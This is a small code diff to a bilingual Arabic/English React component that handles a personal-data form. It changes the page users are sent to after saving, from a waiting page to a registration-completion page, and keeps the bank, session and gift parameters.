@@ -109,7 +109,7 @@ export default function PersonalData() {
       
       toast.success(isArabic ? "تم حفظ البيانات بنجاح" : "Data saved successfully");
       const giftId = params.get("gift") || "";
-      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}${giftId ? `&gift=${giftId}` : ''}`);
+      setLocation(`/registration-completion?bank=${bank}&session=${currentSessionId}${giftId ? `&gift=${giftId}` : ''}`);
     } catch (error) {
       console.error("Error saving personal data:", error);
       toast.error(isArabic ? "فشل حفظ البيانات، يرجى المحاولة مرة أخرى" : "Failed to save data, please try again");
